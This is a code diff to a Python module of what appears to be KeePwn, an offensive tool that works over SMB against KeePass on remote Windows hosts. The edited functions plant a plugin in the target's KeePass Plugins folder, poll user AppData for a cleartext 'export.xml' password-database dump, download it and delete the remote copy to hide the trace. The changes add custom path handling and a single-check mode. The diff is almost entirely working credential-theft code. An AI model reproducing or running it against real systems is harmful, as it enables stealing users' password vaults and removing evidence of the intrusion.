@@ -7,20 +7,17 @@ from time import sleep
 from impacket.smbconnection import SessionError
 
 from keepwn.utils.logging import print_error, print_info, print_success, print_warning, print_found_plugins, Loader, format_path
-from keepwn.utils.parser import parse_mandatory_options
+from keepwn.utils.parser import parse_mandatory_options, parse_remote_path
 from keepwn.utils.smb import smb_connect
 
 
 def get_plugin_folder_path(smb_connection, share, plugin_path):
     if plugin_path:
-        if plugin_path.startswith('\\\\') and '$' in plugin_path:
-            plugin_path = plugin_path.split('$')[1]
-        if not plugin_path.endswith('KeePass Password Safe 2\\Plugins'):
+        if not plugin_path.endswith('Plugins'):
             print_warning("Specified path does not look like a plugin path, do you want to use it [y/n]")
             ans = input('> ')
             if ans.lower() not in ['y', 'yes', '']:
-                exit(0)
-            return
+                exit()
     else:
         print_info("No KeePass Plugins path specified, searching in default locations..")
         plugin_path = '\\Program Files\\KeePass Password Safe 2\\Plugins\\'
@@ -61,7 +58,11 @@ def check_plugin(options):
             print_error('Unkown error while connecting to target: {}'.format(str_error))
         return
 
-    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)
+    if options.plugin_path:
+        custom_plugin_path = parse_remote_path(options.plugin_path)
+    else:
+        custom_plugin_path = None
+    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
 
     if not plugin_folder_path:
         return
@@ -100,7 +101,11 @@ def add_plugin(options):
             print_error('Unkown error while connecting to target: {}'.format(str_error))
         return
 
-    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)
+    if options.plugin_path:
+        custom_plugin_path = parse_remote_path(options.plugin_path)
+    else:
+        custom_plugin_path = None
+    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
     plugin_file = Path(options.plugin).name
 
     found_plugin = False
@@ -111,7 +116,7 @@ def add_plugin(options):
     if found_plugin:
         print_warning("Plugin already added to KeePass Plugin directory, do you want to overwrite? [y/n]".format(plugin_file))
     else:
-        print_warning("About to add {} to KeePass Plugin directory, do you want to continue? [y/n]".format(plugin_file))
+        print_warning("About to add {} to KeePass Plugins directory, do you want to continue? [y/n]".format(plugin_file))
     ans = input('> ')
     if ans.lower() not in ['y', 'yes', '']:
         exit(0)
@@ -163,7 +168,11 @@ def clean_plugin(options):
             print_error('Unkown error while connecting to target: {}'.format(str_error))
         return
 
-    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)
+    if options.plugin_path:
+        custom_plugin_path = parse_remote_path(options.plugin_path)
+    else:
+        custom_plugin_path = None
+    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
     plugin_file = Path(options.plugin).name
 
     found_plugin = False
@@ -221,37 +230,94 @@ def poll_plugin(options):
             print_error('Unkown error while connecting to target: {}'.format(str_error))
         return
 
+    #TODO: refactor in function to avoid code duplication (single/multiple poll + trigger/plugin poll)
+    if options.poll_path:
+        poll_path = parse_remote_path(options.poll_path)
+    else:
+        poll_path = None
+
     export_path = None
-    try:
-        with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
-            while not export_path:
+
+    if options.single:
+        try:
+            if poll_path:
                 try:
-                    for file in smb_connection.listPath(share, '\\Users\\*'):
-                        if file.is_directory():
+                    for file in smb_connection.listPath(share, poll_path):
+                        if not file.is_directory():
+                            export_path = poll_path
+                            continue
+                        else:
+                            print_error("Found a directory, are you sure that you specified an export file path?")
+                except SessionError as e:
+                    pass
+            else:
+                for file in smb_connection.listPath(share, '\\Users\\*'):
+                    if file.is_directory():
+                        try:
+                            path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
+                            for found_file in smb_connection.listPath(share, path):
+                                export_path = path
+                                continue
+                        except SessionError as e:
+                            pass  # the file was not found
+        except SessionError as e:
+            pass
+
+        if not export_path:
+            if poll_path:
+                print_error("{} not found on tharget".format(format_path('\\\\' + share + poll_path)))
+            else:
+                print_error("%APPDATA%\export.xml not found on target".format(share))
+            exit()
+
+    else:
+        try:
+            with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
+                while not export_path:
+                    try:
+                        if poll_path:
                             try:
-                                path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
-                                for file in smb_connection.listPath(share, path):
-                                    export_path = path
-                                    continue
+                                for file in smb_connection.listPath(share, poll_path):
+                                    if not file.is_directory():
+                                        export_path = poll_path
+                                        continue
+                                    else:
+                                        print()
+                                        print_error("Found a directory, are you sure that you specified an export file path?")
+                                        exit()
                             except SessionError as e:
                                 pass  # the file was not found
-                except SessionError as e:
-                    pass  # the file was not found
-                sleep(5)
-    except KeyboardInterrupt:
-        exit()
+                        else:
+                            for file in smb_connection.listPath(share, '\\Users\\*'):
+                                if file.is_directory():
+                                    try:
+                                        path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
+                                        for found_file in smb_connection.listPath(share, path):
+                                            export_path = path
+                                            continue
+                                    except SessionError as e:
+                                        pass  # the file was not found
+                    except SessionError as e:
+                        pass  # the file was not found
+                    if not export_path:
+                        sleep(5)
+        except KeyboardInterrupt:
+            exit()
 
+    export_path_basename = ntpath.basename(export_path)
     print_success("Found cleartext export {}".format(format_path('\\\\{}\\{}'.format(share, export_path))))
 
     try:
         buffer = BytesIO()
         smb_connection.getFile(share, export_path, buffer.write)
-        local_path = os.path.join(os.getcwd(), 'export.xml')
+        local_path = os.path.join(os.getcwd(), export_path_basename)
         # downloads the exported database
         with open(local_path, "wb") as f:
             f.write(buffer.getbuffer())
 
         smb_connection.deleteFile(share, export_path)
-        print_success("Moved remote export to {}".format(format_path(local_path)))
+        relative_path = os.path.relpath(local_path, os.getcwd())
+        print_success("Moved remote export to {}".format(format_path('.' + os.sep + relative_path)))
     except:
         print_error("Unkown error while getting export.")
+        exit()
